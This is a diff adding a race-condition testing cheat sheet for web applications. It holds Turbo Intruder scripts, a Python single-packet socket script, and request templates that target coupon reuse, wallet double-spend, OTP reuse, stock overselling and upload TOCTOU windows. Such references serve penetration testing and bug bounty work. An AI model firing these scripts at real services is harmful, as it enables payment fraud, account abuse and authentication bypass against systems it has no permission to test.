@@ -1,0 +1,171 @@
+# Race Condition — Payloads & Testing Techniques
+# Sources: PortSwigger, PayloadsAllTheThings, real bug bounty writeups (2025-2026)
+# Categories: Turbo Intruder Scripts, Common Patterns, Testing Methodology
+
+# ============================================================
+# SECTION 1: TURBO INTRUDER SCRIPTS (Burp Suite)
+# ============================================================
+
+# --- Basic Race (N simultaneous requests) ---
+"""
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    for i in range(20):
+        engine.queue(target.req, i)
+
+    # Wait for all to complete
+    engine.start(timeout=5)
+
+def handleResponse(req, interesting):
+    if req.status == 200:
+        table.add(req)
+"""
+
+# --- Race with Multiple Endpoints ---
+"""
+def queueRequests(target, wordlists):
+    engine1 = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=10,
+                            requestsPerConnection=1,
+                            pipeline=False)
+    engine2 = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=10,
+                            requestsPerConnection=1,
+                            pipeline=False)
+
+    for i in range(10):
+        engine1.queue(target.req, i)
+        engine2.queue(target.req2, i)
+
+    engine1.start(timeout=5)
+    engine2.start(timeout=5)
+"""
+
+# ============================================================
+# SECTION 2: COMMON RACE CONDITION PATTERNS
+# ============================================================
+
+# --- Coupon / Discount Race ---
+# Pattern: Check `used_count < max_uses` then increment
+# Race goal: All requests pass the check before any increment
+# Target endpoint:
+#   POST /api/cart/apply-coupon
+#   Body: {"code": "SINGLE_USE_50"}
+# Send 20+ simultaneous requests
+
+# --- Account Balance / Double Spend ---
+# Pattern: Read balance, deduct, write new balance
+# Race goal: Multiple reads see same balance, each deducts
+# Target:
+#   POST /api/wallet/transfer
+#   Body: {"to": "attacker", "amount": 100}
+
+# --- Like / Vote / Upvote Race ---
+# Pattern: Check if already voted, then increment
+# Race goal: Multiple likes from same user
+# Target:
+#   POST /api/post/like
+#   Body: {"post_id": 123}
+
+# --- Cart / Stock Race ---
+# Pattern: Check stock > 0, then decrement
+# Race goal: Buy more items than in stock
+# Target:
+#   POST /api/cart/checkout
+#   Body: {"item_id": 456, "quantity": 1}
+# Send N simultaneous checkout requests for same item
+
+# --- Signup / Referral Race ---
+# Pattern: Check if referral code used, then award
+# Race goal: Multiple signups claiming same referral
+# Target:
+#   POST /api/signup
+#   Body: {"referral": "CODE123", "email": "test+{i}@test.com"}
+
+# --- OTP / 2FA Race ---
+# Pattern: Send OTP, validate one-time
+# Race goal: Validate same OTP across multiple sessions
+# Target:
+#   POST /api/verify-otp
+#   Body: {"phone": "...", "code": "123456"}
+# Start 2 sessions simultaneously with same code
+
+# --- Email Verification Race ---
+# Pattern: Send verification email with token, mark verified on use
+# Race goal: Verify same email on multiple accounts
+# Target:
+#   POST /api/verify-email
+#   Body: {"token": "xxx"}
+
+# --- File Upload Race (TOCTOU) ---
+# Pattern: Upload file, check content, move to final location
+# Race goal: Access file during the check window
+# Steps:
+# 1. Start upload in progress
+# 2. Simultaneously request the temp file URL
+
+# ============================================================
+# SECTION 3: RACE CONDITION BYPASS VIA SINGLE PACKET ATTACK
+# ============================================================
+
+# --- HTTP/2 Single Packet Attack ---
+# Send all requests in a single TCP packet (HTTP/2 multiplexing):
+#   1. Use HTTP/2 (h2c or h2)
+#   2. Send all requests in one frame
+#   3. Server processes them simultaneously
+# This bypasses naive rate limiting and race windows
+
+# --- Single Packet Attack with Burp ---
+# Use Turbo Intruder with engine:
+#   engine = RequestEngine(endpoint=target.endpoint,
+#                          concurrentConnections=1,
+#                          requestsPerConnection=100,
+#                          pipeline=True)
+# Pipeline sends requests without waiting for responses
+
+# --- Single Packet Attack via Python ---
+"""
+import socket
+import ssl
+
+def single_packet_attack(host, port, requests):
+    context = ssl.create_default_context()
+    with socket.create_connection((host, port)) as sock:
+        with context.wrap_socket(sock, server_hostname=host) as ssock:
+            # Send all requests in one write
+            ssock.sendall(b'\r\n'.join(requests))
+            # Read responses
+            print(ssock.recv(4096).decode())
+"""
+
+# ============================================================
+# SECTION 4: DETECTION METHODOLOGY
+# ============================================================
+
+# Step 1: Identify state-changing endpoints with race potential
+#   - Coupon/ promo code application
+#   - Balance transfer / payments
+#   - Likes / votes / ratings
+#   - Stock / inventory operations
+#   - Referral bonuses
+#   - Email/phone verification
+#   - File uploads
+#   - Account creation
+#   - Rate-limited operations (login, password reset)
+
+# Step 2: Test with 2-3 simultaneous requests first
+# Step 3: Scale to 20-50 simultaneous requests
+# Step 4: Try different time windows (pre-request delay, post-request delay)
+# Step 5: Try HTTP/1.1 pipeline vs HTTP/2 multiplexing
+
+# ============================================================
+# SECTION 5: TOOLS
+# ============================================================
+# Burp Turbo Intruder:  Built-in Burp extension
+# HTTP/2 single packet:  Burp's HTTP/2 support
+# RaceTheWeb:           python3 racetheweb.py -u https://target.com
+# custom Python:         asyncio + aiohttp for concurrent requests
